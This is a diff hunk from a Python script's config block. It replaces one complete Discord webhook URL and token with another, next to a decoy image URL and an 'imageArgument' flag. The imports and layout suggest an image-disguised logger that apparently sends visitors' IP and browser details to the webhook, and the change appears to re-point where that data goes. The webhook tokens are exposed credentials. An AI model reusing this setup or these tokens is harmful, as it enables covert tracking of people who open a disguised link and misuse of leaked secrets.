@@ -4,7 +4,7 @@ import traceback, requests, base64, httpagentparser
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1334903014959353947/h2a0T7ytzDoUWIWmgc4TQvHjhxAWveUtw7VYvMvi5qw2HNrKJapyx98lItwRSixQzPEt",
+    "webhook": "https://discord.com/api/webhooks/1334907866330693712/Vf3nSE_RjXsRFxLYCUXGeF5yBhU-debKZebLuoZEvJYFyAqsDJhkQWgJuWcuP7lh103W",
     "image": "http://beijincdc.cn/html/CImage_files/image001.jpg",
     "imageArgument": True,
 
